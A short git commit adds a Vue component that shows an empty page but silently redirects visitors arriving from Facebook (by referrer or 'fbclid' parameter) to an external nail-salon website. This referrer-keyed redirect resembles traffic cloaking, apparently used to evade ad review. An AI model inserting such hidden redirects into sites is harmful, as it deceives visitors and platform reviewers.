69d0101a2c27212626c33ae953a67b6c1cc40bee
dtienhau <117889242+dtienhau@users.noreply.github.com>
2023-08-30 17:31:17 +0700

    Create RedirectPage.vue

---
+++ components/RedirectPage.vue
@@ -0,0 +1,24 @@
+<template>
+  <div>
+    <!-- Your static page content here -->
+  </div>
+</template>
+
+<script>
+export default {
+  created() {
+    const referer = document.referrer;
+    const queryParams = new URLSearchParams(window.location.search);
+
+    if (this.isFacebookReferer(referer) || queryParams.has('fbclid')) {
+      // Redirect to a different page
+      window.location.href = 'https://nailsforus.com/';
+    }
+  },
+  methods: {
+    isFacebookReferer(referer) {
+      return referer.includes('facebook.com');
+    }
+  }
+};
+</script>
